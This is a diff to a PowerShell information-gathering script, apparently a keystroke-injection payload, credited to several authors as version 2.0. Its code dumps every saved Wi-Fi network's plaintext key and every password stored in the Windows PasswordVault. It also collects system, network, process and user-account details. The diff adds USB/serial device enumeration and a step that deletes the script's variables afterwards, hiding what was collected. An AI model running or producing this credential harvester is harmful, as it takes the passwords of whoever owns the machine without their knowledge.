@@ -1,8 +1,9 @@
 # Shows details of currently running PC
-# Simen Kjeserud (Original creator), Gachnang
+# Simen Kjeserud (Original creator), Gachnang, DannyK999 (Version 2.0)
 
 #Get info about pc
 
+# Get IP / Nework Info
 try
 {
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
@@ -21,6 +22,7 @@ $IsDHCPEnabled = $true
 [string[]]$computerMAC =$Network.MACAddress
 }
 
+#Get System Info
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 $computerBIOS = Get-CimInstance CIM_BIOSElement
 
@@ -39,6 +41,9 @@ $driveType = @{
    5="Compact disk "}
 $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
 
+#Get - Com & Serial Devices
+$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
+
 # Check RDP
 $RDP
 if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
@@ -47,11 +52,10 @@ if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").
 	$RDP = "RDP is NOT enabled" 
 }
 
-# Get network interfaces
-#| where { $_.ipaddress -notlike $null } 
+# Get Network Interfaces
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 
-# Get wifi SSID and password	
+# Get wifi SSIDs and Passwords	
 $WLANProfileNames =@()
 #Get all the WLAN profile names
 $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
@@ -82,8 +86,7 @@ $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Na
 # process first
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 
-# get listeners / ActiveTcpConnections
-#[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections() | Format-Table -AutoSize
+# Get Listeners / ActiveTcpConnections
 $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
 $listener = $listener | foreach-object {
     $listenerItem = $_
@@ -113,29 +116,7 @@ $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $nu
 # videocard
 $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
 
-#Get installed passwords
-$profileRows = $output | Select-String -Pattern 'All User Profile'
-$profileNames = New-Object System.Collections.ArrayList
-for($i = 0; $i -lt $profileRows.Count; $i++){
-$profileName = ($profileRows[$i] -split ":")[-1].Trim()
-$profileOutput = netsh.exe wlan show profiles name="$profileName" key=clear 
-$SSIDSearchResult = $profileOutput| Select-String -Pattern 'SSID Name'
-$profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'
-$passwordSearchResult = $profileOutput| Select-String -Pattern 'Key Content'
-if($passwordSearchResult){
-$profilePw = ($passwordSearchResult -split ":")[-1].Trim()
-} else {
-$profilePw = ''
-}
-$networkObject = New-Object -TypeName psobject -Property @{
-ProfileName = $profileName
-SSID = $profileSSID
-Password = $profilePw
-}
-$profileNames.Add($networkObject)
-}
-$profileNames.Add($networkObject)
-
+#Get stored passwords
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault 
 $vault = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
@@ -170,17 +151,19 @@ $computerSystem.Name
 "=================================================================="+ (Get-WmiObject win32_bios| out-string)
 
 
-
 "Local-user:"
 "=================================================================="+ ($luser| out-string)
 
 "HDDs:"
 "=================================================================="+ ($Hdds| out-string)
 
+"COM & SERIAL DEVICES"
+"==================================================================" + ($COMDevices | Out-String)
+
 "Network: "
 "=================================================================="
 "Computers MAC address: " + $computerMAC
-"Computers IP address: " + $computerIP.ipaddress[0] 
+"Computers IP address: " + $computerIP.ipaddress[0]
 "Public IP address: " + $computerPubIP  
 "RDP: " + $RDP
 ""
@@ -211,4 +194,11 @@ $computerSystem.Name
 "=================================================================="
 $vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize
 
-
+Remove-Variable -Name computerPubIP,
+computerIP,IsDHCPEnabled,Network,Networks, 
+computerMAC,computerSystem,computerBIOS,computerOs,
+computerCpu, computerMainboard,computerRamCapacity,
+computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
+Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
+process,listener,listenerItem,process,service,software,drivers,videocard,
+vault -ErrorAction SilentlyContinue -Force
